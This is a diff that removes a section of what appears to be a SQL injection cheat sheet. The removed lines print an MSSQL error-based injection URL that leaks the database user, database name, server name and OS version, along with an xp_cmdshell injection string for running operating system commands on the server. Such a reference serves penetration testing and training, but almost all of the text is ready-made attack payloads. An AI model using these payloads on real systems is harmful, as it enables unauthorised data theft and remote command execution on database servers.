@@ -88,19 +88,3 @@
     ```
 
 
-- MSSQL
-    - Error Based SQL
-        ```
-        http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
-        ```
-        - Grab the database user with USER 
-        - Grab the database name with DB_NAME 
-        - Grab the servername with @@servername 
-        - Grab the Windows/OS version with @@version
-
-
-- Shell / Remote Code Execution
-    - Microsoft SQL server that have xp_cmdshell turned on**
-        ```
-        meh' exec master..xp_cmdshell '<command here>' --
-        ```
